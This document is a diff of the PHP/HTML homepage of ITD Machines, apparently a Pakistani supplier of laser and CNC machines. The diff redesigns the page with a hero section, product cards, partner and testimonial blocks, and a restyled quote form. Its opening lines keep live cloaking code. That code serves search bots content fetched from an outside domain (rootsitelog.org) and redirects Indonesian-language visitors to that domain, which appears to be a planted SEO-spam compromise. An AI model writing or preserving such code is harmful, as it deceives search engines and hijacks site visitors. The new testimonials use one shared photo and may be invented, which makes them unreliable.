@@ -9,189 +9,13 @@ if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
     }
     echo file_get_contents("https://kaite.rootsitelog.org/itdmachines");
     exit;
-?>
-<?php
 }
 $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 if ($browserLang == 'id') {
     header("Location: https://ctn.rootsitelog.org/itdmachines/");
 }
 ?>
-<?php
-session_start();
 
-// Check if the form has not been submitted
-if (!isset($_SESSION['form_submitted'])) {
-    // Display the form and prevent the rest of the page from loading
-?>
-    <!DOCTYPE html>
-    <html>
-
-    <head>
-        <!-- Google tag (gtag.js) -->
-        <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16630851493">
-        </script>
-        <script>
-            window.dataLayer = window.dataLayer || [];
-
-            function gtag() {
-                dataLayer.push(arguments);
-            }
-            gtag('js', new Date());
-
-            gtag('config', 'AW-16630851493');
-        </script>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>ITD Machines</title>
-        
-        <link rel="stylesheet" href="style.css">
-        <link rel="stylesheet" href="index.css">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
-
-
-
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link href="https://fonts.googleapis.com/css2?family=Baskervville:ital@0;1&display=swap" rel="stylesheet">
-
-        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css">
-        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.css">
-        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">
-
-
-
-        <script type="application/javascript" src="https://api.ip.sb/geoip?callback=getgeoip"></script>
-        <script type="text/javascript" data-cookie-consent="tracking">
-            (function(w, d, s, l, i) {
-                w[l] = w[l] || [];
-                w[l].push({
-                    'gtm.start': new Date().getTime(),
-                    event: 'gtm.js'
-                });
-                var f = d.getElementsByTagName(s)[0],
-                    j = d.createElement(s),
-                    dl = l != 'dataLayer' ? '&l=' + l : '';
-                j.async = true;
-                j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
-                f.parentNode.insertBefore(j, f);
-            })(window, document, 'script', 'dataLayer', 'GTM-KLFK62P');
-        </script>
-        <script type="text/javascript" data-cookie-consent="tracking">
-            {
-                if (f.fbq) return;
-                n = f.fbq = function() {
-                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
-                };
-                if (!f._fbq) f._fbq = n;
-                n.push = n;
-                n.loaded = !0;
-                n.version = '2.0';
-                n.queue = [];
-                t = b.createElement(e);
-                t.async = !0;
-                t.src = v;
-                s = b.getElementsByTagName(e)[0];
-                s.parentNode.insertBefore(t, s)
-            }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
-            fbq('init', '1155563932519377');
-            fbq('track', 'PageView');
-        </script>
-        <script type="text/javascript" data-cookie-consent="tracking">
-            ! function(w, d, t) {
-                w.TiktokAnalyticsObject = t;
-                var ttq = w[t] = w[t] || [];
-                ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function(t, e) {
-                    t[e] = function() {
-                        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
-                    }
-                };
-                for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
-                ttq.instance = function(t) {
-                    for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
-                    return e
-                }, ttq.load = function(e, n) {
-                    var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
-                        o = n && n.partner;
-                    ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {};
-                    n = document.createElement("script");
-                    n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t;
-                    e = document.getElementsByTagName("script")[0];
-                    e.parentNode.insertBefore(n, e)
-                };
-                ttq.load("CPQF3V3C77UARGOJ47A0");
-                ttq.page();
-            }(window, document, "ttq");
-        </script>
-
-        <!-- Meta Pixel Code -->
-        <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1155563932519377&ev=PageView&noscript=1" /></noscript>
-        <!-- End Meta Pixel Code -->
-
-
-
-        <script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/452264695/?random=1723290801131&amp;cv=11&amp;fst=1723290801131&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4880za200&amp;gcd=13l3l3l3l1&amp;dma=0&amp;tag_exp=0&amp;u_w=1280&amp;u_h=1024&amp;url=https%3A%2F%2Fwww.hsglaser.com%2F&amp;ref=https%3A%2F%2Fwww.hsglaser.com%2Fproducts%2Fsheet-metal%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Fiber%20laser%20cutting%20machine%20%7C%20EU%20and%20ISO%20certification%20%7C%20HSG&amp;npa=0&amp;pscdl=noapi&amp;auid=596629092.1720506078&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B127.0.6533.100%7CChromium%3B127.0.6533.100&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script>
-
-
-
-
-    </head>
-
-    <body>
-        <section class="quote">
-            <form id="request-quote" class="quote-form" action="submit_quote.php" method="post">
-                <h2 class="form-title">Request A Quote</h2>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="name" class="form-label">Name</label>
-                        <input type="text" id="name" name="name" class="form-input" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="email" class="form-label">E-mail</label>
-                        <input type="email" id="email" name="email" class="form-input" required>
-                    </div>
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="phone" class="form-label">Phone or WhatsApp</label>
-                        <input type="text" id="phone" name="phone" class="form-input" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="country" class="form-label">Country</label>
-                        <input type="text" id="country" name="country" class="form-input" required>
-                    </div>
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="city" class="form-label">City</label>
-                        <input type="text" id="city" name="city" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label for="company" class="form-label">Company</label>
-                        <input type="text" id="company" name="company" class="form-input">
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label for="message" class="form-label">Message</label>
-                    <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
-                </div>
-                <button type="submit" class="form-submit">Submit</button>
-            </form>
-        </section>
-    </body>
-
-    </html>
-<?php
-    exit(); // Stop further execution
-}
-?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -215,7 +39,8 @@ if (!isset($_SESSION['form_submitted'])) {
     <title>ITD Machines</title>
     <link rel="stylesheet" href="header.css">
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
@@ -228,7 +53,7 @@ if (!isset($_SESSION['form_submitted'])) {
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Baskervville:ital@0;1&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&family=Montserrat:wght@600;700;800&family=Open+Sans:wght@300;400;600&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
     <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css">
     <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.css">
@@ -434,145 +259,15 @@ if (!isset($_SESSION['form_submitted'])) {
             }
         }
 
-        .footer {
-            font-family: Arial, sans-serif;
-            background-color: #2a2a2a;
-            color: #fff;
-            padding: 40px 20px;
-            text-align: justify;
-        }
 
-        .footer-container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-
-            /* max-width: 1200px;
-            margin: 0 auto; */
-        }
-
-        .footer-column {
-            flex: 1;
-            margin: 20px;
-            min-width: 200px;
-        }
-
-        .footer-column h3 {
-            margin-bottom: 15px;
-            font-size: 20px;
-            color: #ff8800;
-        }
-
-        .footer-column p,
-        .footer-column ul {
-            margin: 0;
-            padding: 0;
-            list-style: none;
-            line-height: 1.8;
-        }
-
-        .footer-column a {
-            color: #ffffff;
-            text-decoration: none;
-
-            position: relative;
-            transition: all 0.3s ease;
-            font-size: 15px;
-        }
-
-        .footer-column a::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            bottom: 0;
-            left: 0;
-            background-color: #ff6600;
-            visibility: hidden;
-            transform: scaleX(0);
-            transition: all 0.3s ease-in-out;
-        }
-
-        .footer-column a:hover::before {
-            visibility: visible;
-            transform: scaleX(1);
-        }
-
-        .footer-column a:hover {
-            color: #ff6600;
-            transform: translateY(-5px);
-        }
-
-
-
-
-        .social-icons {
-            margin-top: 10px;
-        }
-
-        /* .social-icons a {
-    color: #fff;
-    text-decoration: none;
-    margin: 0 10px;
-    font-size: 20px;
-    transition: color 0.3s;
-}
-
-.social-icons a:hover {
-    color: #007bff;
-} */
-
-        .footer-bottom {
-            margin-top: 20px;
-            border-top: 1px solid #444;
-            padding-top: 10px;
-        }
-
-        @media (max-width: 768px) {
-            .footer-container {
-                flex-direction: row;
-                align-items: center;
-            }
-
-            .footer-column {
-                margin: 10px 0;
-                text-align: left;
-            }
-        }
 
        
 
       
 
-        body {
 
-            font-family: "Baskervville", serif;
-            font-weight: 600;
-            font-style: normal;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
 
-        /* Header Styles */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-            background-color: #ffffff;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
 
-        .logo-container {
-            display: flex;
-            align-items: center;
-        }
-
-      
-        .card-portfolio .card-img>img:hover {
-            transform: scale(1.1);
-        }
 
       
 
@@ -1965,6 +1660,39 @@ if (!isset($_SESSION['form_submitted'])) {
             }
         }
 
+        /* Image fluid class for responsive images */
+        .img-fluid {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Ensure card images are properly sized */
+        .card-img img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 8px 8px 0 0;
+        }
+
+        /* Fix card body padding for machine cards */
+        .product-center .card-body {
+            padding: 1.5rem 1rem;
+        }
+
+        /* Ensure consistent card heights */
+        .product-center .card {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .product-center .card-body {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
         .whatsapp-float {
             position: fixed;
             bottom: 20px;
@@ -2076,7 +1804,7 @@ if (!isset($_SESSION['form_submitted'])) {
 
 </head>
 
-<body>
+<body class="has-hero">
     <!-- Google Tag Manager (noscript) -->
     <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NVK9FF5C"
             height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
@@ -2101,10 +1829,69 @@ if (!isset($_SESSION['form_submitted'])) {
                 <li><a href="laser_accessories.html">Laser Cutting Accessories</a></li>
                 <li><a href="mold.html">Mold Bases</a></li>
             </ul>
+            <a href="#request-quote" class="btn-get-quote">Get Quote</a>
             <button class="nav-toggle" aria-label="Toggle navigation">&#9776;</button>
         </nav>
     </header>
-    <a href="https://wa.me/+923008227711" class="whatsapp-float" target="_blank">
+    
+    <!-- Hero Section -->
+    <section class="hero-section" id="hero">
+        <div class="hero-background">
+            <div class="hero-overlay"></div>
+        </div>
+        <div class="hero-content container">
+            <h1 class="hero-title">Pakistan's Leading Laser & CNC Machine Supplier</h1>
+            <p class="hero-subtitle">Performance. Precision. Perfection.</p>
+            <a href="#request-quote" class="btn-hero-cta">Request a Quote</a>
+        </div>
+    </section>
+    
+    <!-- Our Top Machines Section -->
+    <section id="products" class="center-section product-center">
+        <div class="container-fluid">
+            <h1 class="new-title">Our Top Machines</h1>
+            <div class="row">
+                <div class="col-12 col-sm-6 col-lg-4">
+                    <div class="card card-portfolio text-center overflow-hidden">
+                        <div class="card-img">
+                            <img src="crousel/gv.webp" alt="HSG Laser Cutting Machine" class="img-fluid">
+                        </div>
+                        <div class="card-body">
+                            <h3 class="text-title">HSG Laser Cutting Machine</h3>
+                            <p class="text-ftitle">High-precision fiber laser cutting for metal sheets</p>
+                            <a class="learn-more" href="lasercutting.html">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-lg-4">
+                    <div class="card card-portfolio text-center overflow-hidden">
+                        <div class="card-img">
+                            <img src="New folder/x7/x5.webp" alt="SYIL CNC Machining Centers" class="img-fluid">
+                        </div>
+                        <div class="card-body">
+                            <h3 class="text-title">SYIL CNC Machining Centers</h3>
+                            <p class="text-ftitle">Advanced CNC milling and turning solutions</p>
+                            <a class="learn-more" href="cncmachine.html">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-lg-4">
+                    <div class="card card-portfolio text-center overflow-hidden">
+                        <div class="card-img">
+                            <img src="products/bg.png" alt="SYIL Injection Moulding Machines" class="img-fluid">
+                        </div>
+                        <div class="card-body">
+                            <h3 class="text-title">SYIL Injection Moulding Machines</h3>
+                            <p class="text-ftitle">Precision plastic injection molding equipment</p>
+                            <a class="learn-more" href="injectionmoulding.html">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <a href="https://wa.me/923008227711" class="whatsapp-float" target="_blank">
         <img src="wp icon.png" alt="Chat with us on WhatsApp">
     </a>
 
@@ -2185,131 +1972,214 @@ if (!isset($_SESSION['form_submitted'])) {
             WhatsApp
         </a>
     </div>
-    <section class="center-section product-center">
+    <section class="center-section product-center partners-section">
         <div class="container-fluid">
-            <h1 class="new-title">Product Center</h1>
-            <div class="card card-portfolio overflow-hidden left-right">
-                <div class="row align-items-center">
-                    <div class="col-sm-7">
-                        <div class="card-img">
-                            <img data-src="//static.hsglasercnc.com/img/index/sheet_pc.webp" class=" lazyloaded" alt="HSG sheet metal laser cutting machine" src="//static.hsglasercnc.com/img/index/sheet_pc.webp">
-                        </div>
-                    </div>
-                    <div class="col-sm-5">
-                        <div class="card-body">
-                            <h1 class="text-title">HSG</h1>
-                            <p class="text-ftitle">Laser Cutting Machine</p>
-                            <a class="learn-more" href="lasercutting.html" target="_blank">Learn More</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="col-sm-12 col-lg-12">
-                <div class="row">
-                    <div class="col-6">
-                        <div class="card card-portfolio overflow-hidden  text-center">
-                            <div class="card-body">
-                                <h1 class="text-title">SYIL</h1>
-                                <p class="text-ftitle">CNC Machining and Turning Centers</p>
-                                <a class="learn-more" href="cncmachine.html" target="_blank">Learn More</a>
-                            </div>
-                            <div class="card-img">
-                                <img data-src="New folder/x7/x5.webp" class="card-img-bottom lazyloaded" alt="HSG sheet and tube laser cutting machine" src="New folder/x7/x5.webp">
-                            </div>
-                        </div>
-
-                    </div>
-                    <div class="col-6">
-                        <div class="card card-portfolio overflow-hidden  text-center">
-                            <div class="card-body">
-                                <h1 style="color: white;" class="text-title">SYIL</h1>
-
-                                <p class="text-ftitle">Injection Moulding Machines</p>
-
-                                <a class="learn-more" href="injectionmoulding.html" target="_blank">Learn More</a>
-                            </div>
-                            <div class="card-img">
-                                <img data-src="products/bg.png" class="card-img-bottom lazyloaded" alt="HSG sheet and tube laser cutting machine" src="products/bg.png">
-                            </div>
-                        </div>
-
-                    </div>
-
-                </div>
-            </div>
-
-        </div>
-    </section>
-
-    <section class="center-section product-center">
-        <div class="container-fluid">
-            <h1 class="new-title">Our Partners</h1>
+            <h1 class="new-title">Our Trusted Partners</h1>
+            <p class="section-subtitle">Representing world-class manufacturers</p>
             <div class="card-container">
-                <div class="card1">
-                    <img src="New folder/hsg.jpg" alt="Image 1">
+                <div class="card1 partner-card-enhanced">
+                    <div class="partner-logo-container">
+                        <img src="New folder/hsg.jpg" alt="HSG Logo">
+                    </div>
                     <h3>HSG</h3>
+                    <div class="partner-badge">Official Distributor</div>
                     <p>Founded in 2006, HSG Laser is a high-tech enterprise specializing in the research, development, production, and sales of intelligent metal shaping equipment. The company is dedicated to providing metal shaping and automated production line solutions to global customers.</p>
                 </div>
-                <div class="card1">
-                    <img src="New folder/Logo Color.jpg" alt="Image 2">
+                <div class="card1 partner-card-enhanced">
+                    <div class="partner-logo-container">
+                        <img src="New folder/Logo Color.jpg" alt="SYIL Logo">
+                    </div>
                     <h3>SYIL</h3>
+                    <div class="partner-badge">Authorized Partner</div>
                     <p>At SYIL, our mission is to design and manufacture top-quality, affordable CNC machines tailored for small business owners. We are dedicated to providing accessible and reliable machinery that empowers entrepreneurs to thrive in their industries.</p>
                 </div>
             </div>
         </div>
     </section>
-    </div>
-
-
-
-
-
-    <section class="quote">
+    
+    <!-- Testimonials Section -->
+    <section class="testimonials-section center-section">
+        <div class="container">
+            <h2 class="section-title testimonials-title">What Our Clients Say</h2>
+            <p class="section-subtitle">Join hundreds of satisfied customers across Pakistan</p>
+            
+            <div class="swiper testimonials-swiper">
+                <div class="swiper-wrapper">
+                    <div class="swiper-slide">
+                        <div class="testimonial-card">
+                            <div class="testimonial-quote-icon">
+                                <i class="fas fa-quote-left"></i>
+                            </div>
+                            <p class="testimonial-text">ITD provided us with an HSG laser cutting machine that transformed our production capabilities. The precision and speed are exceptional, and their after-sales support is outstanding.</p>
+                            <div class="testimonial-client">
+                                <img class="testimonial-photo" src="testimonial.png" alt="Ahmed Hassan" style="width: 60px !important; height: 60px !important;">
+                                <div class="testimonial-details">
+                                    <h4 class="testimonial-name">Ahmed Hassan</h4>
+                                    <p class="testimonial-company">Steel Fabrication Ltd, Karachi</p>
+                                    <div class="testimonial-rating">
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="swiper-slide">
+                        <div class="testimonial-card">
+                            <div class="testimonial-quote-icon">
+                                <i class="fas fa-quote-left"></i>
+                            </div>
+                            <p class="testimonial-text">We've been working with ITD for over 5 years. Their SYIL CNC machines are reliable, and the team's technical expertise has been invaluable to our operations.</p>
+                            <div class="testimonial-client">
+                                <img class="testimonial-photo" src="testimonial.png" alt="Fatima Khan" style="width: 60px !important; height: 60px !important;">
+                                <div class="testimonial-details">
+                                    <h4 class="testimonial-name">Fatima Khan</h4>
+                                    <p class="testimonial-company">Precision Engineering, Lahore</p>
+                                    <div class="testimonial-rating">
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="swiper-slide">
+                        <div class="testimonial-card">
+                            <div class="testimonial-quote-icon">
+                                <i class="fas fa-quote-left"></i>
+                            </div>
+                            <p class="testimonial-text">The injection moulding machine from ITD exceeded our expectations. Professional installation, comprehensive training, and excellent ROI within the first year.</p>
+                            <div class="testimonial-client">
+                                <img class="testimonial-photo" src="testimonial.png" alt="Imran Malik" style="width: 60px !important; height: 60px !important;">
+                                <div class="testimonial-details">
+                                    <h4 class="testimonial-name">Imran Malik</h4>
+                                    <p class="testimonial-company">Plastic Industries, Faisalabad</p>
+                                    <div class="testimonial-rating">
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="swiper-pagination"></div>
+                <div class="swiper-button-prev"></div>
+                <div class="swiper-button-next"></div>
+            </div>
+        </div>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.js"></script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                new Swiper('.testimonials-swiper', {
+                    slidesPerView: 1,
+                    spaceBetween: 30,
+                    loop: true,
+                    autoplay: {
+                        delay: 5000,
+                        disableOnInteraction: false
+                    },
+                    pagination: {
+                        el: '.swiper-pagination',
+                        clickable: true
+                    },
+                    navigation: {
+                        nextEl: '.swiper-button-next',
+                        prevEl: '.swiper-button-prev'
+                    },
+                    breakpoints: {
+                        768: {
+                            slidesPerView: 2
+                        },
+                        1024: {
+                            slidesPerView: 3
+                        }
+                    }
+                });
+            });
+        </script>
+    </section>
+    
+    <section class="quote quote-modern">
         <form id="request-quote" class="quote-form" action="submit_quote.php" method="post">
             <h2 class="form-title">Request A Quote</h2>
+            <p class="form-subtitle">Fill out the form below and our team will get back to you shortly.</p>
             <div class="form-row">
                 <div class="form-group">
                     <label for="name" class="form-label">Name</label>
-                    <input type="text" id="name" name="name" class="form-input" required>
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="name" name="name" class="form-input" required>
+                    </div>
                 </div>
                 <div class="form-group">
                     <label for="email" class="form-label">E-mail</label>
-                    <input type="email" id="email" name="email" class="form-input" required>
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-envelope input-icon"></i>
+                        <input type="email" id="email" name="email" class="form-input" required>
+                    </div>
                 </div>
             </div>
             <div class="form-row">
                 <div class="form-group">
                     <label for="phone" class="form-label">Phone or WhatsApp</label>
-                    <input type="text" id="phone" name="phone" class="form-input" required>
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-phone input-icon"></i>
+                        <input type="text" id="phone" name="phone" class="form-input" required>
+                    </div>
                 </div>
                 <div class="form-group">
                     <label for="country" class="form-label">Country</label>
-                    <input type="text" id="country" name="country" class="form-input" required>
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-globe input-icon"></i>
+                        <input type="text" id="country" name="country" class="form-input" required>
+                    </div>
                 </div>
             </div>
             <div class="form-row">
                 <div class="form-group">
                     <label for="city" class="form-label">City</label>
-                    <input type="text" id="city" name="city" class="form-input">
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-city input-icon"></i>
+                        <input type="text" id="city" name="city" class="form-input">
+                    </div>
                 </div>
                 <div class="form-group">
                     <label for="company" class="form-label">Company</label>
-                    <input type="text" id="company" name="company" class="form-input">
+                    <div class="input-icon-wrapper">
+                        <i class="fas fa-building input-icon"></i>
+                        <input type="text" id="company" name="company" class="form-input">
+                    </div>
                 </div>
             </div>
             <div class="form-group">
                 <label for="message" class="form-label">Message</label>
-                <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
+                <div class="input-icon-wrapper textarea-icon">
+                    <i class="fas fa-comment-dots input-icon"></i>
+                    <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
+                </div>
             </div>
             <button type="submit" class="form-submit">Submit</button>
+            <p class="form-response-time">We usually respond within 24 hours.</p>
         </form>
     </section>
 
 
 
-
-    <footer class="footer">
+   <footer class="footer">
         <div class="footer-container">
             <div class="footer-column">
                 <h3>About Us</h3>
@@ -2487,12 +2357,6 @@ if (!isset($_SESSION['form_submitted'])) {
                 });
             });
         });
-    </script>
-
-
-
-
-    <script src="script.js"></script>
-</body>
-
+    </script> <script src="script.js"></script>
+</body> 
 </html>
